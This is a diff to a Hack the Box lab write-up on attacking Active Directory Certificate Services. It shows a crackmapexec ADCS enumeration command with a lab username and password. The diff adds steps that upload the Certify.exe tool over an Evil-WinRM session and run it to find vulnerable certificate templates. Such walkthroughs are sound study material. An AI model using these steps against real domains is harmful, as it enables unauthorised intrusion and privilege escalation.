@@ -518,3 +518,14 @@ ADCS Certificate
 root@kali# crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/78738a7e-4951-4494-b252-7f6830911634)
+
+Certify
+[Download Compiled](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/dotnet%20v4.5%20compiled%20binaries/Certify.exe)
+```shell
+*Evil-WinRM* PS C:\Users\Ryan.Cooper> upload Certify.exe
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/07df93e3-b299-4c8e-b169-283d27be2dc8)
+
+```shell
+*Evil-WinRM* PS C:\Users\Ryan.Cooper> .\Certify.exe find /vulnerable
+```
